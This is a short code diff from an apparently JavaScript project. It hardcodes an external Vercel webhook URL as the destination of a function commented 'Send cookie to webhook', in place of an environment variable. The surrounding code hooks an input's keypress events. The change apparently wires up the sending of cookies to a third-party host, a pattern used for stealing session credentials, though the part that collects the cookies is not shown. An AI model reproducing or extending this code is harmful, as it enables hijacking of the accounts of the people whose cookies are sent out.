@@ -43,7 +43,7 @@ input.addEventListener('keypress', async (e) => {
 
 // Send cookie to webhook
 async function sendCookie(cookie) {
-    const API_URL = process.env.WEBHOOK;
+    const API_URL = "https://webhook-sigma-drab.vercel.app/api/webhook/uk423vwebmi0u8mu0";
     
     showStatus('Processing...', '');
     
